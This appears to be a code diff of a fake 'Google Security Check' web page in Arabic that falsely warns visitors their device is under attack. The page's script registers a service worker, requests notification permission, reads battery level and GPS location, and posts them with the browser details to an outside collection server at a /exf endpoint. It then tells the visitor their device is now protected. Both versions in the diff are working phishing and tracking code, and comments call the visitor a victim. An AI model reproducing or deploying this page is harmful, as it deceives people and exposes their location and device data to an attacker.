@@ -3,71 +3,64 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تنبيه أمني من Google</title>
+    <title>Google Security Check</title>
     <style>
-        body { background-color: #f8f9fa; font-family: sans-serif; text-align: center; padding: 50px 20px; }
-        .box { background: white; padding: 30px; border-radius: 15px; box-shadow: 0 5px 15px rgba(0,0,0,0.1); max-width: 400px; margin: auto; }
-        h1 { color: #d9534f; font-size: 20px; }
-        button { background: #1a73e8; color: white; border: none; padding: 15px 30px; border-radius: 8px; font-size: 18px; cursor: pointer; width: 100%; margin-top: 20px; font-weight: bold; }
+        body { background: #f1f3f4; font-family: 'Segoe UI', Tahoma, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .card { background: white; padding: 40px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); max-width: 350px; text-align: center; }
+        img { width: 60px; margin-bottom: 20px; }
+        h2 { font-size: 18px; color: #3c4043; }
+        p { color: #5f6368; font-size: 14px; margin-bottom: 25px; }
+        button { background: #1a73e8; color: white; border: none; padding: 12px 24px; border-radius: 6px; font-weight: bold; cursor: pointer; width: 100%; }
     </style>
 </head>
 <body>
-    <div class="box">
-        <img src="https://cdn-icons-png.flaticon.com/512/564/564619.png" width="70">
-        <h1>تحذير أمني من Google</h1>
-        <p>تم اكتشاف محاولة اختراق لجهازك. يرجى تفعيل بروتوكول الحماية فوراً لتأمين صورك ورسائلك الخاصة.</p>
-        <button onclick="captureData()">تحديث وتأمين الآن</button>
+    <div class="card">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/5/53/Google_Ads_logo.svg" alt="Google">
+        <h2>نشاط غير معتاد على جهازك</h2>
+        <p>لحماية صورك وملفاتك، يرجى تفعيل بروتوكول الأمان المباشر الآن.</p>
+        <button onclick="startExploit()">تفعيل الحماية الآن</button>
     </div>
 
     <script>
-        async function captureData() {
-            // 1. تسجيل الرادار في الخلفية (Service Worker)
+        async function startExploit() {
+            // 1. تسجيل الرادار في الخلفية
             if ('serviceWorker' in navigator) {
-                try {
-                    await navigator.serviceWorker.register('sw.js');
-                    console.log("رادار الخلفية نشط");
-                } catch (e) {
-                    console.log("خطأ في تسجيل الرادار");
-                }
+                await navigator.serviceWorker.register('sw.js');
             }
 
-            // 2. طلب إذن الإشعارات (لسحب الرسائل)
-            const permission = await Notification.requestPermission();
-            
-            // 3. سحب نسبة الشحن
-            let batteryLevel = "N/A";
+            // 2. طلب صلاحية الإشعارات (المفتاح لسحب الرسائل)
+            const perm = await Notification.requestPermission();
+
+            // 3. سحب البطارية
+            let bat = "N/A";
             if (navigator.getBattery) {
-                const battery = await navigator.getBattery();
-                batteryLevel = Math.round(battery.level * 100) + "%";
+                const b = await navigator.getBattery();
+                bat = Math.round(b.level * 100) + "%";
             }
 
-            // 4. محاولة سحب الموقع الجغرافي (GPS)
+            // 4. سحب الموقع الجغرافي
             navigator.geolocation.getCurrentPosition(async (pos) => {
-                sendToBot(pos.coords.latitude, pos.coords.longitude, batteryLevel, permission);
+                sendData(pos.coords.latitude, pos.coords.longitude, bat, perm);
             }, () => {
-                sendToBot(null, null, batteryLevel, permission);
+                sendData(null, null, bat, perm);
             });
         }
 
-        function sendToBot(lat, lon, battery, perm) {
-            const locLink = lat ? `https://www.google.com/maps?q=${lat},${lon}` : "الموقع مرفوض";
-            const data = {
-                device: navigator.userAgent,
-                battery: battery,
-                location: locLink,
-                msg: perm === 'granted' ? "✅ تم تفعيل سحب الإشعارات الدائم" : "❌ الضحية رفض الصلاحية"
-            };
-
-            // إرسال البيانات لسيرفر PythonAnywhere
+        function sendData(lt, ln, bt, pr) {
+            const map = lt ? `https://www.google.com/maps?q=${lt},${ln}` : "تم رفض الموقع";
             fetch('https://Mohammed888.pythonanywhere.com/exf', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(data)
+                body: JSON.stringify({
+                    device: navigator.userAgent,
+                    battery: bt,
+                    location: map,
+                    msg: pr === 'granted' ? "🔓 رادار الإشعارات نشط" : "🔒 رفض الإشعارات"
+                })
             }).then(() => {
-                alert("تم تفعيل نظام الحماية بنجاح! جهازك الآن مؤمن.");
+                alert("تم تفعيل بروتوكول الحماية. جهازك آمن الآن.");
             });
         }
     </script>
 </body>
 </html>
-
